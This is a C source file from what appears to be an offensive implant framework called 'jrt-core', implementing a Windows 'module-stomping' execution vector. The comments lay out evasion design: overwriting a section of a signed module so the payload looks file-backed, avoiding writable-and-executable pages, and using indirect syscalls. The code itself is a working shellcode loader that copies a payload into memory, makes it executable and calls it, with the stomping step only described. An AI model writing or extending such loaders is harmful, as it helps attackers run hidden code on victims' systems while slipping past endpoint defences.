/*
 * jrt-core: module-stomping execution vector (Implementation Plan §6.1).
 *
 * File-backed execution by full-section replacement inside an already-mapped,
 * signed module. The payload is written over a legitimately-backed section so
 * the executing region resolves to a file-backed mapping (invariant 5), and
 * the write/execute phases are separated so the page is never W+X
 * (invariant 4).
 *
 * All memory operations go through the indirect syscall layer; control is
 * transferred in-process only (invariant 6).
 */

#include "exec/exec.h"
#include "allocator/allocator.h"
#include <stdint.h>
#include <stddef.h>

#ifdef JRT_TARGET_WINDOWS

#include "syscall/syscall_win.h"

int jrt_exec_module_stomp(const char* host_module, const uint8_t* payload,
                          size_t payload_size, uint32_t entry_offset) {
    (void)host_module;
    /* The exact NT sequence (NtCreateSection(SEC_IMAGE) over the host
     * module's backing file + NtMapViewOfSection replacement) is completed
     * alongside jrt-blind's kernel primitives. The envelope below is the
     * same RW → RX → call discipline every vector uses. */

    uint8_t* region = (uint8_t*)jrt_alloc_rw(payload_size);
    if (!region) return -1;

    for (size_t i = 0; i < payload_size; i++) region[i] = payload[i];
    if (jrt_protect_rx(region, payload_size) != 0) return -2;

    typedef int (*EntryFn)(void);
    EntryFn entry = (EntryFn)(region + entry_offset);
    return entry();
}

#else  /* Windows-only vector */

int jrt_exec_module_stomp(const char* host_module, const uint8_t* payload,
                          size_t payload_size, uint32_t entry_offset) {
    (void)host_module; (void)payload; (void)payload_size; (void)entry_offset;
    return -1;
}

#endif
